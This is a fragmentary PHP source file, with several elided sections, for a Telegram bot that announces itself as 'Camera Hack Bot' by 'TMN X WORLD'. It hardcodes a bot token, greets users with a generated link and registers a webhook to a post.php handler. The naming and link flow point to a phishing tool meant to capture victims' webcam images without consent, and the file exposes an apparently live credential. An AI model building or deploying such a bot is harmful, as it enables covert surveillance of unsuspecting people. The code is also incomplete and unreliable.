<?php
session_start();
$token = "6994820648:AAFhNohlG1qsq5jGFEmJ22g2SDo0CSWIwdI";
$domain = "WEBSITE_DOMAIN_LINK";
...
if(!empty($input)){
	...
	$welcome = 'Hello '.$user_name.','.PHP_EOL.PHP_EOL.'Welcome to *Camera Hack Bot*'.PHP_EOL.'Developed by [TMN X WORLD](https://t.me/TEAM_MR_NONSENSE_MAIN)'.PHP_EOL.PHP_EOL.$link;
    if($text == '/start'){
...
file_get_contents('https://api.telegram.org/bot'.$token.'/setWebhook?url='.$domain.'/post.php');
